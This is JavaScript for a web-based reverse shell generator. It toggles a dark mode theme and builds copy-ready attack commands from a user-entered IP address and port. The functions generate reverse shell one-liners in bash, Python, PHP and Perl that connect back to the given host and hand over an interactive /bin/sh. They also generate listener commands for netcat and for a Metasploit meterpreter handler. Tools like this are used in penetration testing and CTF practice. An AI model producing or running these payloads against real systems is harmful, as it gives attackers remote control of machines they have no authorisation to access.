const checkbox = document.getElementById("theme")

checkbox.addEventListener("change", () => {

    // body background

    document.body.classList.toggle("body-darkmode");

    // h1

    var h1 = document.getElementsByTagName("h1");
    h1[0].classList.toggle("h1-darkmode");

    // h5 

    var h5 = document.getElementsByTagName("h5");
    h5[0].classList.toggle("h5-darkmode");
    h5[1].classList.toggle("h5-darkmode");
    h5[2].classList.toggle("h5-darkmode");

    // Upper content div

    var upperDiv = document.getElementById("upper-cont");
    upperDiv.classList.toggle("upper-cont-darkmode");

    // Info div

    let infoDiv = document.getElementById("info-div");
    infoDiv.classList.toggle("info-div-darkmode");

    // Listener div

    var listenerDiv = document.getElementById("listener-div");
    listenerDiv.classList.toggle("listener-div-darkmode");

    // IP and port 

    var input = document.getElementsByTagName("input");
    input[1].classList.toggle("input-darkmode");
    input[2].classList.toggle("input-darkmode");

    // Dropdown 

    var select = document.getElementsByTagName("select");
    select[0].classList.toggle("select-darkmode");

    // Listener output

    var listenerOut = document.getElementById("listener-output");
    listenerOut.classList.toggle("listener-output-darkmode");

    // Code outputs

    var code = document.getElementsByTagName("code");
    code[0].classList.toggle("code-darkmode");
    code[1].classList.toggle("code-darkmode");

    // Generate listener button

    var generateBtn = document.getElementById("generate-btn");
    generateBtn.classList.toggle("generate-btn-darkmode");

    // Language selector div

    var langSelector = document.getElementById("language-selector");
    langSelector.classList.toggle("language-selector-darkmode");

    // Language buttons

    var selectBash = document.getElementById("select-bash");
    selectBash.classList.toggle("select-bash-darkmode");

    var selectPython = document.getElementById("select-python3");
    selectPython.classList.toggle("select-python3-darkmode");

    var selectPhp = document.getElementById("select-php");
    selectPhp.classList.toggle("select-php-darkmode");

    var selectPerl = document.getElementById("select-perl");
    selectPerl.classList.toggle("select-perl-darkmode");

    // Reverse Shell output code

    var shellOut = document.getElementById("shell-output");
    shellOut.classList.toggle("shell-output-darkmode");
})


function generateListener(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;
    
    var type = document.getElementById("type").value;

    if (ip == "" || port == "") {
        document.getElementById("listener-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("listener-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("listener-code").innerHTML = "Please enter a port."
    } else {
        if (type == "nc") {
            document.getElementById("listener-code").innerHTML = "nc -nlvp " + port.fontcolor("#a55800");
        } else {
            document.getElementById("listener-code").innerHTML = "msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost " + ip.fontcolor("#a55800") + "; set lport " + port.fontcolor("#a55800") + "; exploit'";
        }
    }
}

function generateBash(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "bash -i >& /dev/tcp/" + ip.fontcolor("#a55800") + "/" + port.fontcolor("#a55800") + " 0>&1"

    }
}

function generatePython(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip.fontcolor("#a55800") +  "\"," + port.fontcolor("#a55800") + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    }
}

function generatePhp(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "php -r '$sock=fsockopen(\"" + ip.fontcolor("#a55800") + "\"," + port.fontcolor("#a55800") + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    }
}

function generatePerl(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "perl -e 'use Socket;$i=\"" + ip.fontcolor("#a55800") + "\";$p=" + port.fontcolor("#a55800") + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

    }
}